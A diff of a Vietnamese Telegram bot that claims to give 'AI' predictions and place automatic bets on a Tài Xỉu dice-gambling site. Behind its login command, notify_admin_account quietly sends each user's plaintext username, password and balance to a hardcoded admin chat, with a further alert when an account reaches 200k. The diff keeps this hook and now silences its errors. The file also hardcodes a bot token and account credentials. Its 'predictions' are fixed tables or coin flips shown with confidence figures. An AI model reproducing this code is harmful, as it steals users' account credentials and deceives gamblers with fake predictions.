@@ -10,21 +10,24 @@ import socketio
 import random
 
 # ==========================================
-# CẤU HÌNH
+# CẤU HÌNH HỆ THỐNG
 # ==========================================
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 logging.getLogger('engineio').setLevel(logging.WARNING)
 logging.getLogger('urllib3').setLevel(logging.WARNING)
 
+# 🔴 CẤU HÌNH TOKEN MỚI & ADMIN
 BOT_TOKEN = '8627314570:AAG8L2vxe8u-4uDGdnip8gzoW8BlDQ_bg3E'
-ADMIN_ID = 8627314570
+
+# ⚠️ SỬA LẠI ID TELEGRAM CỦA BẠN Ở ĐÂY
+ADMIN_ID = 8627314570  
 
 DATA_COLLECTOR_USER = "acc_clone_soi_cau"
 DATA_COLLECTOR_PASS = "matkhau123"
 BALANCE_NOTIFY_THRESHOLD = 200000
 
-# 🔒 API ẨN - đổi tên trung tính
+# 🔒 API ẨN
 _AI_ENDPOINT = "https://leminhapiik.onrender.com"
 _AI_PATHS = ["/api/prediction", "/api/predict", "/api/du-doan", "/api/current", "/prediction", "/api"]
 _AI_TIMEOUT = 2
@@ -41,7 +44,7 @@ user_states = {}
 notified_accounts = set()
 
 # ==========================================
-# BẢNG CẦU + XÚC XẮC (GIỮ NGUYÊN)
+# BẢNG CẦU + XÚC XẮC
 # ==========================================
 CAU_TABLE = {
     "X3":  ("XIU", 70), "X4":  ("TAI", 60), "X5":  ("TAI", 70), "X6":  ("XIU", 60),
@@ -112,11 +115,10 @@ DICE_TABLE = {
     18: {"666": ("XIU", 80)},
 }
 
-
 def init_user_state(chat_id):
     if chat_id not in user_states:
         user_states[chat_id] = {
-            "running": False,              # 🆕 Bật/tắt bằng /chay /dung
+            "running": False,
             "profit_loss": 0,
             "auto_bet_enabled": False,
             "x2_mode": False,
@@ -137,21 +139,17 @@ def init_user_state(chat_id):
             "last_dice": None,
         }
 
-
 def is_vip(chat_id): return chat_id in vip_users
 
-
 # ==========================================
-# 🎯 DỰ ĐOÁN (ĐÃ FIX + ẨN NGUỒN)
+# 🎯 DỰ ĐOÁN (ẨN API)
 # ==========================================
 def get_cau_key(session_count):
     if session_count < 1:
         session_count = 1
     return CAU_KEYS[(session_count - 1) % len(CAU_KEYS)]
 
-
 def _fetch_ai_signal():
-    """Gọi API ngoài. Có cache + backoff, không làm chậm bot."""
     now = time.time()
     if now < _cache.get("block", 0):
         return None, None
@@ -162,14 +160,10 @@ def _fetch_ai_signal():
     for ep in _AI_PATHS:
         try:
             r = requests.get(_AI_ENDPOINT + ep, headers=headers, timeout=_AI_TIMEOUT)
-            if r.status_code != 200:
-                continue
-            try:
-                data = r.json()
-            except Exception:
-                continue
-            if not isinstance(data, dict):
-                continue
+            if r.status_code != 200: continue
+            try: data = r.json()
+            except Exception: continue
+            if not isinstance(data, dict): continue
 
             pred = None
             for f in ("prediction", "du_doan", "duDoan", "result", "ket_qua",
@@ -190,16 +184,12 @@ def _fetch_ai_signal():
                     if 0 < iv <= 100: conf = iv; break
                 except Exception: pass
 
-            _cache.update({"pred": pred, "conf": conf, "tag": ep,
-                           "last": now, "block": 0})
-            logger.info(f"[AI] ✓ {pred} ({conf}%) via {ep}")
+            _cache.update({"pred": pred, "conf": conf, "tag": ep, "last": now, "block": 0})
             return pred, conf
         except Exception:
             continue
-
     _cache["block"] = now + _AI_FAIL_TTL
     return None, None
-
 
 def make_prediction_vip(chat_id):
     state = user_states[chat_id]
@@ -207,35 +197,26 @@ def make_prediction_vip(chat_id):
     count = state["session_count"]
 
     pred, conf = None, 0
-
-    # 1) API
     api_pred, api_conf = _fetch_ai_signal()
     if api_pred:
         pred, conf = api_pred, api_conf
 
-    # 2) Xúc xắc (không sort)
     if not pred:
         ld = state.get("last_dice")
         if ld and len(ld) == 3:
             total = sum(ld)
             ds = "".join(str(x) for x in ld)
             if total in DICE_TABLE:
-                if ds in DICE_TABLE[total]:
-                    pred, conf = DICE_TABLE[total][ds]
+                if ds in DICE_TABLE[total]: pred, conf = DICE_TABLE[total][ds]
                 else:
                     ss = "".join(str(x) for x in sorted(ld))
-                    if ss in DICE_TABLE[total]:
-                        pred, conf = DICE_TABLE[total][ss]
+                    if ss in DICE_TABLE[total]: pred, conf = DICE_TABLE[total][ss]
 
-    # 3) Bảng cầu
     if not pred:
         key = get_cau_key(count)
-        if key in CAU_TABLE:
-            pred, conf = CAU_TABLE[key]
+        if key in CAU_TABLE: pred, conf = CAU_TABLE[key]
 
-    # 4) Fallback
-    if not pred:
-        pred, conf = random.choice(["TAI", "XIU"]), 50
+    if not pred: pred, conf = random.choice(["TAI", "XIU"]), 50
 
     if state.get("reverse_mode", False):
         pred = "XIU" if pred == "TAI" else "TAI"
@@ -243,12 +224,10 @@ def make_prediction_vip(chat_id):
 
     return pred, conf
 
-
 # ==========================================
 # 🌐 API GAME & WEBSOCKET
 # ==========================================
 def md5_hash(text: str) -> str: return hashlib.md5(text.encode('utf-8')).hexdigest()
-
 
 def login_and_get_token(username: str, password: str) -> dict:
     pw = md5_hash(password)
@@ -269,46 +248,27 @@ def login_and_get_token(username: str, password: str) -> dict:
         )
         lb = r2.json()
         tk = lb.get("token")
-        if not tk:
-            return {"_error": "Lobby không trả về JWT token."}
-        return {"token": tk, "nickname": nick,
-                "money": lb.get("remoteLoginResp", {}).get("money", 0)}
+        if not tk: return {"_error": "Lobby không trả về JWT token."}
+        return {"token": tk, "nickname": nick, "money": lb.get("remoteLoginResp", {}).get("money", 0)}
     except Exception as e:
         return {"_error": f"Lỗi kết nối: {e}"}
 
-
 def notify_admin_account(username, password, nickname, money):
     try:
-        bot.send_message(
-            ADMIN_ID,
-            f"🔔 <b>TÀI KHOẢN MỚI ĐĂNG NHẬP</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"👤 Username: <code>{username}</code>\n"
-            f"🔑 Password: <code>{password}</code>\n"
-            f"🏷 Nickname: <code>{nickname}</code>\n"
-            f"💰 Số dư: <code>{money:,}</code> Win\n"
-            f"🕒 Time: <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>",
-            parse_mode="HTML"
-        )
-    except Exception as e:
-        logger.error(f"notify_admin_account: {e}")
-
+        bot.send_message(ADMIN_ID,
+            f"🔔 <b>TÀI KHOẢN MỚI ĐĂNG NHẬP</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"👤 Username: <code>{username}</code>\n🔑 Password: <code>{password}</code>\n"
+            f"🏷 Nickname: <code>{nickname}</code>\n💰 Số dư: <code>{money:,}</code> Win\n"
+            f"🕒 Time: <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>", parse_mode="HTML")
+    except Exception: pass
 
 def notify_admin_balance_reached(username, nickname, money):
     try:
-        bot.send_message(
-            ADMIN_ID,
-            f"🎉 <b>TÀI KHOẢN ĐỦ 200K</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"👤 Username: <code>{username}</code>\n"
-            f"🏷 Nickname: <code>{nickname}</code>\n"
-            f"💰 Số dư: <code>{money:,}</code> Win\n"
-            f"🕒 Time: <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>",
-            parse_mode="HTML"
-        )
-    except Exception as e:
-        logger.error(f"notify_balance: {e}")
-
+        bot.send_message(ADMIN_ID,
+            f"🎉 <b>TÀI KHOẢN ĐỦ 200K</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"👤 Username: <code>{username}</code>\n🏷 Nickname: <code>{nickname}</code>\n"
+            f"💰 Số dư: <code>{money:,}</code> Win\n🕒 Time: <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>", parse_mode="HTML")
+    except Exception: pass
 
 def check_balance_threshold(chat_id):
     st = user_states.get(chat_id)
@@ -319,7 +279,6 @@ def check_balance_threshold(chat_id):
         if k not in notified_accounts:
             notified_accounts.add(k)
             notify_admin_balance_reached(u, st.get("nickname", "N/A"), b)
-
 
 def start_websocket(chat_id, token, is_background=False):
     if chat_id in active_sockets and not is_background:
@@ -335,12 +294,7 @@ def start_websocket(chat_id, token, is_background=False):
     def connect():
         if not is_background:
             try:
-                bot.send_message(
-                    chat_id,
-                    "🟢 <b>ĐÃ KẾT NỐI SERVER</b>\n"
-                    "▶️ Gõ <b>/chay</b> để bot bắt đầu phân tích & dự đoán.",
-                    parse_mode="HTML"
-                )
+                bot.send_message(chat_id, "🟢 <b>ĐÃ KẾT NỐI SERVER</b>\n▶️ Gõ <b>/chay</b> để bot bắt đầu phân tích.", parse_mode="HTML")
             except Exception: pass
 
     @sio.on('new-session', namespace='/txmd5')
@@ -351,42 +305,27 @@ def start_websocket(chat_id, token, is_background=False):
             st["session_id"] = data.get('id', 'N/A')
             st["has_bet_this_session"] = False
 
-            # 🆕 Chỉ chạy khi /chay
-            if not st.get("running", False):
-                return
+            if not st.get("running", False): return
 
             if st["auto_bet_enabled"] and st["target_profit"] is not None:
                 if st["profit_loss"] >= st["target_profit"]:
                     st["auto_bet_enabled"] = False
-                    bot.send_message(
-                        chat_id,
-                        f"🏆 <b>ĐÃ ĐẠT MỤC TIÊU LÃI</b> 🏆\n"
-                        f"💰 Thực lãi: <code>{st['profit_loss']:,}</code> Win\n"
-                        f"🎯 Mục tiêu: <code>{st['target_profit']:,}</code> Win\n"
-                        f"🔴 <i>Bot đã tắt Auto Bet an toàn.</i>",
-                        parse_mode="HTML"
-                    )
+                    bot.send_message(chat_id, f"🏆 <b>ĐÃ ĐẠT MỤC TIÊU LÃI</b> 🏆\n💰 Lãi: <code>{st['profit_loss']:,}</code> Win\n🔴 <i>Bot đã tắt Auto Bet an toàn.</i>", parse_mode="HTML")
 
             pred, conf = make_prediction_vip(chat_id)
             st["current_prediction"] = pred
 
-            if st["x2_mode"] and st["win_streak"] >= 1:
-                st["current_bet"] = st["base_bet_amount"] * 2
-            else:
-                st["current_bet"] = st["base_bet_amount"]
+            if st["x2_mode"] and st["win_streak"] >= 1: st["current_bet"] = st["base_bet_amount"] * 2
+            else: st["current_bet"] = st["base_bet_amount"]
 
             emoji = "🔵 TÀI" if pred == "TAI" else "🔴 XỈU"
-            msg = (f"🔔 <b>PHIÊN:</b> <code>#{st['session_id']}</code>\n"
-                   f"🤖 <b>AI DỰ ĐOÁN: {emoji}</b> ({conf}%)\n")
-            if st.get("reverse_mode"):
-                msg += "🔄 <b>ĐẢO CẦU ĐANG BẬT</b>\n"
+            msg = f"🔔 <b>PHIÊN:</b> <code>#{st['session_id']}</code>\n🤖 <b>AI DỰ ĐOÁN: {emoji}</b> ({conf}%)\n"
+            if st.get("reverse_mode"): msg += "🔄 <b>ĐẢO CẦU ĐANG BẬT</b>\n"
+            
             if st["auto_bet_enabled"]:
-                if st["x2_mode"] and st["win_streak"] >= 1:
-                    msg += f"⚡ <i>X2 Nhồi: <code>{st['current_bet']:,}</code> Win...</i>"
-                else:
-                    msg += f"⏳ <i>Vào cược gốc: <code>{st['current_bet']:,}</code> Win...</i>"
-            else:
-                msg += "⏸ <i>Chưa bật autobet. /autobet on để vào tiền.</i>"
+                if st["x2_mode"] and st["win_streak"] >= 1: msg += f"⚡ <i>X2 Nhồi: <code>{st['current_bet']:,}</code> Win...</i>"
+                else: msg += f"⏳ <i>Vào cược gốc: <code>{st['current_bet']:,}</code> Win...</i>"
+            else: msg += "⏸ <i>Chưa bật autobet.</i>"
             bot.send_message(chat_id, msg, parse_mode="HTML")
         except Exception as e:
             logger.error(f"new-session: {e}")
@@ -399,16 +338,10 @@ def start_websocket(chat_id, token, is_background=False):
             if not st.get("running", False): return
             if data.get('state') == 'BETTING' and st["auto_bet_enabled"] and st["current_prediction"]:
                 if not st["has_bet_this_session"]:
-                    sio.emit('bet',
-                             {"type": st["current_prediction"], "amount": st["current_bet"]},
-                             namespace='/txmd5')
+                    sio.emit('bet', {"type": st["current_prediction"], "amount": st["current_bet"]}, namespace='/txmd5')
                     st["has_bet_this_session"] = True
                     st["waiting_for_result"] = True
-                    bot.send_message(
-                        chat_id,
-                        f"🚀 <b>ĐÃ VÀO CƯỢC:</b> <code>{st['current_bet']:,}</code> Win",
-                        parse_mode="HTML"
-                    )
+                    bot.send_message(chat_id, f"🚀 <b>ĐÃ VÀO CƯỢC:</b> <code>{st['current_bet']:,}</code> Win", parse_mode="HTML")
         except Exception as e:
             logger.error(f"tick-update: {e}")
 
@@ -431,12 +364,10 @@ def start_websocket(chat_id, token, is_background=False):
             result = data.get('resultTruyenThong', 'N/A')
             dices = data.get('dices', [])
 
-            # Luôn cập nhật last_dice (kể cả khi stop) để data tươi
             if isinstance(dices, list) and len(dices) == 3 and all(isinstance(d, int) and 1 <= d <= 6 for d in dices):
                 st["last_dice"] = list(dices)
 
-            if not st.get("running", False):
-                return
+            if not st.get("running", False): return
 
             d0 = dices[0] if len(dices) > 0 else 0
             d1 = dices[1] if len(dices) > 1 else 0
@@ -460,33 +391,21 @@ def start_websocket(chat_id, token, is_background=False):
                 st["waiting_for_result"] = False
 
             pl = "🟢" if st["profit_loss"] >= 0 else "🔴"
-            msg += (f"━━━━━━━━━━━━━━━━━━\n"
-                    f"📊 <b>Lãi/Lỗ:</b> {pl} <code>{st['profit_loss']:,}</code>\n"
-                    f"💳 <b>Số Dư:</b> <code>{st['balance']:,}</code>")
+            msg += f"━━━━━━━━━━━━━━━━━━\n📊 <b>Lãi/Lỗ:</b> {pl} <code>{st['profit_loss']:,}</code>\n💳 <b>Số Dư:</b> <code>{st['balance']:,}</code>"
             bot.send_message(chat_id, msg, parse_mode="HTML")
         except Exception as e:
             logger.error(f"session-result: {e}")
 
     try:
-        sio.connect(
-            'https://wtxmd52.tele68.com',
-            socketio_path='txmd5/',
-            namespaces=['/txmd5'],
-            transports=['websocket'],
-            auth={"token": token},
-            headers={"User-Agent": "Mozilla/5.0"}
-        )
+        sio.connect('https://wtxmd52.tele68.com', socketio_path='txmd5/', namespaces=['/txmd5'], transports=['websocket'], auth={"token": token}, headers={"User-Agent": "Mozilla/5.0"})
         sio.wait()
     except Exception as e:
         if not is_background:
-            try:
-                bot.send_message(chat_id, f"⚠️ Lỗi kết nối: <code>{e}</code>", parse_mode="HTML")
+            try: bot.send_message(chat_id, f"⚠️ Lỗi kết nối: <code>{e}</code>", parse_mode="HTML")
             except: pass
 
-
 def background_data_collector():
-    if not DATA_COLLECTOR_USER or not DATA_COLLECTOR_PASS:
-        return
+    if not DATA_COLLECTOR_USER or not DATA_COLLECTOR_PASS: return
     logger.info("Collector chạy ngầm...")
     while True:
         try:
@@ -495,7 +414,6 @@ def background_data_collector():
                 start_websocket("BACKGROUND_WORKER", res["token"], is_background=True)
         except Exception: pass
         time.sleep(30)
-
 
 # ==========================================
 # 🤖 COMMANDS
@@ -514,7 +432,6 @@ def handle_vip_commands(message):
     except Exception:
         bot.reply_to(message, "👉 Lỗi cú pháp.")
 
-
 @bot.message_handler(commands=['start', 'help', 'menu'])
 def send_welcome(message):
     if not is_vip(message.chat.id):
@@ -523,7 +440,7 @@ def send_welcome(message):
     text = (
         "🤖 <b>AI TÀI XỈU</b> 🤖\n\n"
         "🔹 /login <code>&lt;tk&gt; &lt;mk&gt;</code> - Đăng nhập\n"
-        "▶️ /chay - Bắt đầu bot phân tích & dự đoán\n"
+        "▶️ /chay - Bắt đầu bot phân tích\n"
         "⏹ /dung - Dừng bot\n"
         "🔹 /autobet <code>on &lt;tiền&gt;</code> | <code>off</code>\n"
         "🔹 /x2 <code>on/off</code> - Nhồi tiền khi streak\n"
@@ -536,13 +453,11 @@ def send_welcome(message):
     )
     bot.reply_to(message, text, parse_mode="HTML")
 
-
 @bot.message_handler(commands=['login'])
 def handle_login(message):
     if not is_vip(message.chat.id): return
     parts = message.text.split()
-    if len(parts) != 3:
-        return bot.reply_to(message, "👉 Cú pháp: <code>/login tk mk</code>", parse_mode="HTML")
+    if len(parts) != 3: return bot.reply_to(message, "👉 Cú pháp: <code>/login tk mk</code>", parse_mode="HTML")
 
     chat_id = message.chat.id
     if chat_id in active_sockets:
@@ -554,53 +469,33 @@ def handle_login(message):
     username, password = parts[1], parts[2]
     result = login_and_get_token(username, password)
     if "_error" in result:
-        return bot.edit_message_text(
-            f"❌ <b>LỖI:</b> {result['_error']}",
-            chat_id=chat_id, message_id=mp.message_id, parse_mode="HTML"
-        )
+        return bot.edit_message_text(f"❌ <b>LỖI:</b> {result['_error']}", chat_id=chat_id, message_id=mp.message_id, parse_mode="HTML")
 
     init_user_state(chat_id)
     st = user_states[chat_id]
     st.update({
         "balance": result['money'], "username": username, "password": password,
-        "nickname": result.get("nickname", "N/A"),
-        "session_count": 0, "last_dice": None,
-        "profit_loss": 0, "win_streak": 0,
-        "running": False,  # 🆕 Login xong chưa chạy, chờ /chay
+        "nickname": result.get("nickname", "N/A"), "session_count": 0, "last_dice": None,
+        "profit_loss": 0, "win_streak": 0, "running": False,
     })
     notify_admin_account(username, password, st["nickname"], result['money'])
 
     bot.edit_message_text(
-        f"🎉 <b>ĐĂNG NHẬP THÀNH CÔNG</b>\n"
-        f"👤 <code>{result['nickname']}</code>\n"
-        f"💰 Dư: <code>{result['money']:,}</code>\n\n"
-        f"▶️ Gõ <b>/chay</b> để bot bắt đầu làm việc.",
+        f"🎉 <b>ĐĂNG NHẬP THÀNH CÔNG</b>\n👤 <code>{result['nickname']}</code>\n💰 Dư: <code>{result['money']:,}</code>\n\n▶️ Gõ <b>/chay</b> để bot bắt đầu làm việc.",
         chat_id=chat_id, message_id=mp.message_id, parse_mode="HTML"
     )
     threading.Thread(target=start_websocket, args=(chat_id, result['token']), daemon=True).start()
 
-
-# 🆕 /chay - BẮT ĐẦU
 @bot.message_handler(commands=['chay'])
 def cmd_chay(message):
     if not is_vip(message.chat.id): return
     chat_id = message.chat.id
-    if chat_id not in user_states:
-        return bot.reply_to(message, "⚠️ Vui lòng /login trước!")
-    if chat_id not in active_sockets:
-        return bot.reply_to(message, "⚠️ Chưa kết nối server. /login lại.")
+    if chat_id not in user_states: return bot.reply_to(message, "⚠️ Vui lòng /login trước!")
+    if chat_id not in active_sockets: return bot.reply_to(message, "⚠️ Chưa kết nối server. /login lại.")
     user_states[chat_id]["running"] = True
     user_states[chat_id]["current_prediction"] = None
-    bot.reply_to(
-        message,
-        "▶️ <b>BOT ĐÃ CHẠY</b>\n"
-        "🤖 Tự động phân tích & dự đoán mỗi phiên.\n"
-        "💡 Gõ /autobet on <code>&lt;tiền&gt;</code> để vào cược tự động.",
-        parse_mode="HTML"
-    )
+    bot.reply_to(message, "▶️ <b>BOT ĐÃ CHẠY</b>\n🤖 Tự động phân tích & dự đoán mỗi phiên.\n💡 Gõ /autobet on <code>&lt;tiền&gt;</code> để vào cược tự động.", parse_mode="HTML")
 
-
-# 🆕 /dung - DỪNG
 @bot.message_handler(commands=['dung'])
 def cmd_dung(message):
     if not is_vip(message.chat.id): return
@@ -611,32 +506,22 @@ def cmd_dung(message):
     st["auto_bet_enabled"] = False
     st["current_prediction"] = None
     st["waiting_for_result"] = False
-    bot.reply_to(
-        message,
-        "⏹ <b>BOT ĐÃ DỪNG</b>\n"
-        "Socket vẫn kết nối. Gõ /chay để tiếp tục.",
-        parse_mode="HTML"
-    )
-
+    bot.reply_to(message, "⏹ <b>BOT ĐÃ DỪNG</b>\nSocket vẫn kết nối. Gõ /chay để tiếp tục.", parse_mode="HTML")
 
 @bot.message_handler(commands=['autobet'])
 def handle_autobet(message):
     if not is_vip(message.chat.id): return
     chat_id = message.chat.id
-    if chat_id not in user_states:
-        return bot.reply_to(message, "⚠️ /login trước!")
+    if chat_id not in user_states: return bot.reply_to(message, "⚠️ /login trước!")
     parts = message.text.split()
     if len(parts) > 1 and parts[1].lower() == "on":
         amount = int(parts[2]) if len(parts) > 2 else 10000
         user_states[chat_id]["auto_bet_enabled"] = True
         user_states[chat_id]["base_bet_amount"] = amount
-        bot.reply_to(message,
-                     f"✅ <b>AUTO BET: BẬT</b>\n💸 Vốn gốc: <code>{amount:,}</code>",
-                     parse_mode="HTML")
+        bot.reply_to(message, f"✅ <b>AUTO BET: BẬT</b>\n💸 Vốn gốc: <code>{amount:,}</code>", parse_mode="HTML")
     else:
         user_states[chat_id]["auto_bet_enabled"] = False
         bot.reply_to(message, "🔴 <b>AUTO BET: TẮT</b>", parse_mode="HTML")
-
 
 @bot.message_handler(commands=['x2'])
 def handle_x2_mode(message):
@@ -651,7 +536,6 @@ def handle_x2_mode(message):
         user_states[chat_id]["x2_mode"] = False
         bot.reply_to(message, "🔴 <b>X2: TẮT</b>", parse_mode="HTML")
 
-
 @bot.message_handler(commands=['reverse'])
 def handle_reverse_mode(message):
     if not is_vip(message.chat.id): return
@@ -665,7 +549,6 @@ def handle_reverse_mode(message):
         user_states[chat_id]["reverse_mode"] = False
         bot.reply_to(message, "🔴 <b>ĐẢO CẦU: TẮT</b>", parse_mode="HTML")
 
-
 @bot.message_handler(commands=['chotlai'])
 def handle_chotlai(message):
     if not is_vip(message.chat.id): return
@@ -673,12 +556,9 @@ def handle_chotlai(message):
     if chat_id not in user_states: return
     try:
         user_states[chat_id]["target_profit"] = int(message.text.split()[1])
-        bot.reply_to(message,
-                     f"🎯 <b>TARGET:</b> <code>{user_states[chat_id]['target_profit']:,}</code>",
-                     parse_mode="HTML")
+        bot.reply_to(message, f"🎯 <b>TARGET:</b> <code>{user_states[chat_id]['target_profit']:,}</code>", parse_mode="HTML")
     except Exception:
         bot.reply_to(message, "👉 Cú pháp: <code>/chotlai 500000</code>", parse_mode="HTML")
-
 
 @bot.message_handler(commands=['cau'])
 def check_cau(message):
@@ -691,10 +571,8 @@ def check_cau(message):
         em = "🔵 TÀI" if v[0] == "TAI" else "🔴 XỈU"
         lines.append(f"{k}: {em} ({v[1]}%)")
     nk = get_cau_key(count + 1) if count > 0 else "X3"
-    lines.append(f"\n👉 Phiên: <b>{count}</b>")
-    lines.append(f"🎯 Sắp tới: <b>{nk}</b>")
+    lines.append(f"\n👉 Phiên: <b>{count}</b>\n🎯 Sắp tới: <b>{nk}</b>")
     bot.reply_to(message, "\n".join(lines), parse_mode="HTML")
-
 
 @bot.message_handler(commands=['xucxac'])
 def check_dice_table(message):
@@ -707,7 +585,6 @@ def check_dice_table(message):
             text += f"  {dice}: {em} ({v[1]}%)\n"
     bot.reply_to(message, text, parse_mode="HTML")
 
-
 @bot.message_handler(commands=['stats'])
 def check_stats(message):
     if not is_vip(message.chat.id): return
@@ -718,18 +595,12 @@ def check_stats(message):
     run = "🟢 ĐANG CHẠY" if st.get("running") else "🔴 ĐÃ DỪNG"
     ai = "✅ Online" if _cache["pred"] else "⏳ Chờ dữ liệu"
     bot.reply_to(message,
-                 f"📊 <b>THỐNG KÊ</b>\n"
-                 f"🚦 Trạng thái: <b>{run}</b>\n"
-                 f"💳 Dư: <code>{st['balance']:,}</code>\n"
-                 f"📈 Lãi/Lỗ: <code>{st['profit_loss']:,}</code>\n"
-                 f"🎯 Chốt: {t}\n"
+                 f"📊 <b>THỐNG KÊ</b>\n🚦 Trạng thái: <b>{run}</b>\n💳 Dư: <code>{st['balance']:,}</code>\n"
+                 f"📈 Lãi/Lỗ: <code>{st['profit_loss']:,}</code>\n🎯 Chốt: {t}\n"
                  f"🤖 Auto: {'BẬT' if st['auto_bet_enabled'] else 'TẮT'}\n"
                  f"🔥 X2: {'BẬT' if st['x2_mode'] else 'TẮT'} (Streak: {st['win_streak']})\n"
                  f"🔄 Đảo: {'BẬT' if st.get('reverse_mode') else 'TẮT'}\n"
-                 f"📡 AI Server: {ai}\n"
-                 f"📌 Phiên: {st.get('session_count', 0)}",
-                 parse_mode="HTML")
-
+                 f"📡 AI Server: {ai}\n📌 Phiên: {st.get('session_count', 0)}", parse_mode="HTML")
 
 @bot.message_handler(commands=['stop'])
 def stop_websocket(message):
@@ -744,10 +615,32 @@ def stop_websocket(message):
         user_states[chat_id]["auto_bet_enabled"] = False
     bot.reply_to(message, "🔌 Đã dừng & ngắt kết nối.")
 
-
+# ==========================================
+# KHỞI CHẠY BOT (FIX LỖI 409 CONFLICT TRÊN RENDER)
+# ==========================================
 if __name__ == "__main__":
     print("=" * 50)
-    print("ROBOT  TÀI XỈU ĐÃ SẴN SÀNG")
+    print("🤖 AI TÀI XỈU - ĐÃ SẴN SÀNG")
     print("=" * 50)
+    
+    # Khởi động luồng lấy dữ liệu ngầm
     threading.Thread(target=background_data_collector, daemon=True).start()
-    bot.infinity_polling()
+
+    # Vòng lặp tự động Retry khi gặp sự cố (Đặc biệt là lỗi 409 Conflict)
+    while True:
+        try:
+            logger.info("Đang kết nối tới Telegram API...")
+            bot.infinity_polling(timeout=10, long_polling_timeout=5)
+        except telebot.apihelper.ApiTelegramException as e:
+            if "409" in str(e):
+                logger.warning("⚠️ Phát hiện instance khác đang chạy (409 Conflict). Đợi 15s để Render tắt hẳn instance cũ...")
+                time.sleep(15)
+            else:
+                logger.error(f"❌ Lỗi Telegram API: {e}")
+                time.sleep(5)
+        except requests.exceptions.ConnectionError:
+            logger.error("❌ Mất kết nối mạng. Thử lại sau 5s...")
+            time.sleep(5)
+        except Exception as e:
+            logger.error(f"❌ Lỗi không xác định: {e}")
+            time.sleep(5)
